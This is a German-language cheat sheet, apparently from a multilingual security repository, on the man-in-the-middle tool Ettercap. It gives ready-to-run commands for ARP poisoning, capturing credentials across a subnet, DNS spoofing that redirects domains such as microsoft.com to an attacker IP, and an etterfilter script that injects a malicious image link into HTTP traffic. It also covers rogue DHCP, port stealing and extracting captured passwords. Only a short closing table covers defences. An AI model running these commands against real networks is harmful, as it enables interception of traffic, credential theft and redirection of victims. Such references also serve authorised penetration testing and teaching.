<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Ettercap-Spickzettel

[Ettercap](https://www.ettercap-project.org/) ist eine umfassende Suite für Man-in-the-Middle-Angriffe (MITM) auf lokale Netzwerke (LAN). Es bietet Sniffing von Live-Verbindungen, Content-Filterung im laufenden Betrieb, aktive und passive Analyse vieler Protokolle sowie Unterstützung für ARP-Poisoning, ICMP-Weiterleitungen, DHCP-Spoofing und Port-Stealing.

---

## Inhaltsverzeichnis

- [Kernarchitektur und Modi](#core-architecture--modes)
- [Installation & Schnelleinrichtung](#installation--quick-setup)
- [ARP-Vergiftung und Schnüffeln](#arp-poisoning--sniffing)
- [DNS-Spoofing-Angriffe](#dns-spoofing-attacks)
- [Benutzerdefinierte Paketfilterung (`etterfilter`)](#custom-packet-filtering-etterfilter)
- [DHCP-Spoofing und Port-Stealing](#dhcp-spoofing--port-stealing)
- [Protokollierung und Paketextraktion](#logging--packet-extraction)
- [Defensive Erkennung und Gegenmaßnahmen](#defensive-detection--countermeasures)

---

## Kernarchitektur und Modi

Ettercap unterstützt mehrere Ausführungsmodi:
- **`-T` (Textmodus):** Leichte, nicht verfluchte Terminalausgabe, ideal für Skripterstellung und Headless-Automatisierung.
- **`-C` (Curses-Modus):** Ncurses-basierte Terminal-Benutzeroberfläche für interaktive Vorgänge ohne X11.
- **`-G` (GTK-Modus):** Vollständige grafische Oberfläche.
- **`-D` (Daemon-Modus):** Läuft still im Hintergrund.

Syntax der Zielspezifikation:
```text
/MAC/IPs/IPv6/PORTs
```
- Ziele können durch Kommas getrennt oder IP-Bereiche sein: `//` stimmt mit allem überein.
- Beispiel: `/192.168.1.50/` zielt auf die IP-Adresse `192.168.1.50` auf allen Ports ab.
- Beispiel: `//80,443/` zielt auf alle Hosts auf den Ports 80 und 443 ab.

---

## Installation und schnelle Einrichtung
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y ettercap-text-only ettercap-graphical

# Arch Linux / BlackArch
sudo pacman -S ettercap

# Enable IP forwarding on the host system
sudo sysctl -w net.ipv4.ip_forward=1
```
Überprüfen Sie die Speicherorte der Konfigurationsdateien:
- `/etc/ettercap/etter.conf`: Kernnetzwerk- und Privilege-Drop-Konfiguration.
- `/etc/ettercap/etter.dns`: Nachschlagetabelle für DNS-Spoofing-Datensätze.

---

## ARP-Vergiftung und Schnüffeln

### 1. Zwei-Wege-Remote-ARP-Vergiftung
Vergiften Sie ARP-Tabellen zwischen einer Ziel-Workstation und dem Netzwerk-Gateway:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-T`: Textmodus.
- `-q`: Leiser Modus (reduziert die Ausführlichkeit, zeigt nur erfasste Anmeldeinformationen an).
- `-i eth0`: Netzwerkschnittstelle zum Abhören und Einspeisen.
- `-M arp:remote`: Führen Sie eine bidirektionale Man-in-the-Middle-ARP-Vergiftung durch.

### 2. Sniffing des gesamten Subnetzes (einseitig / Broadcast)
Vergiften Sie alle Hosts im Subnetz gegen das Standard-Gateway:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote // /192.168.1.1//
```
### 3. Nur passives Schnüffeln
Erfassen Sie Klartext-Anmeldeinformationen, die den aktuellen Host passieren, ohne ARP-Spoofing:
```bash
sudo ettercap -T -q -i eth0
```
---

## DNS-Spoofing-Angriffe

Ettercap enthält integrierte Plugins, einschließlich `dns_spoof`.

### Schritt 1: `/etc/ettercap/etter.dns` konfigurieren
Platzhalter oder spezifische Domänenumleitung hinzufügen:
```text
# Redirect target domain to attacker machine
target.corp.local      A   192.168.1.100
*.target.corp.local    A   192.168.1.100
microsoft.com          A   192.168.1.100
```
### Schritt 2: Starten Sie Ettercap mit dem DNS-Plugin
```bash
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-P dns_spoof`: Aktiviert das DNS-Spoofing-Plugin.
– Abgefangene DNS-Abfragen, die mit `etter.dns` übereinstimmen, geben die IP des Angreifers zurück.

---

## Benutzerdefinierte Paketfilterung (`etterfilter`)

Ettercap ermöglicht die Paketprüfung und Nutzlaständerung in Echtzeit mithilfe benutzerdefinierter Filterskripte.

### 1. Filterskript schreiben (`replace_img.filter`)
```text
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    replace("img src=", "img src=\"http://192.168.1.100/evil.jpg\" ");
    msg("[*] Injected malicious image link!\n");
}
```
### 2. Filter mit `etterfilter` kompilieren
```bash
etterfilter replace_img.filter -o replace_img.ef
```
### 3. Mit Filter ausführen
```bash
sudo ettercap -T -q -i eth0 -F replace_img.ef -M arp:remote /192.168.1.50// /192.168.1.1//
```
---

## DHCP-Spoofing und Port-Stealing

### 1. Rogue-DHCP-Server-Angriff
Reagieren Sie schneller als der legitime DHCP-Server, um unerwünschte Gateway- und DNS-Adressen zuzuweisen:
```bash
sudo ettercap -T -i eth0 -M dhcp:192.168.1.200-250/255.255.255.0/192.168.1.1
```
- Syntax: `dhcp:<ip_pool_start-end>/<netmask>/<dns_ip>`

### 2. Port-Stealing-Angriff (Switch Flooding / CAM-Tabellenmissbrauch)
Stehlen Sie Datenverkehr in Switch-Netzwerken, in denen ARP-Poisoning blockiert oder gemeldet wird:
```bash
sudo ettercap -T -q -i eth0 -M port /192.168.1.50// /192.168.1.1//
```
---

## Protokollierung und Paketextraktion

### Roh erfasste Sitzungen speichern
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1// -w capture.pcap -L ettercap_log
```
- `-w capture.pcap`: Rohe PCAP-Paketdaten schreiben.
- `-L ettercap_log`: Zerlegte, für Menschen lesbare Textprotokolle schreiben.

### Binärprotokolle mit `etterlog` konvertieren
```bash
# Print captured credentials and passwords
etterlog -p ettercap_log.eci

# Extract traffic in pcap format
etterlog -c -F TCP:192.168.1.50:80 ettercap_log.ecp -w http_session.pcap
```
---

## Defensive Erkennung und Gegenmaßnahmen

| Vektor | Erkennungs- und Abwehrmechanismus |
|---|---|
| **ARP-Spoofing** | Aktivieren Sie Dynamic ARP Inspection (DAI) auf verwalteten Switches; Überprüfen Sie `arp -a` auf doppelte MACs. Führen Sie `arpwatch` oder `arpon` aus. |
| **DNS-Spoofing** | Erzwingen Sie DNSSEC, DoH (DNS-over-HTTPS) oder DoT (DNS-over-TLS). |
| **DHCP-Spoofing** | Aktivieren Sie DHCP-Snooping auf Switches, um vertrauenswürdige Uplink-Ports festzulegen. |
| **Portdiebstahl** | Implementieren Sie 802.1X Network Access Control (NAC) und Portsicherheit mit MAC-Limits pro Switch-Port. |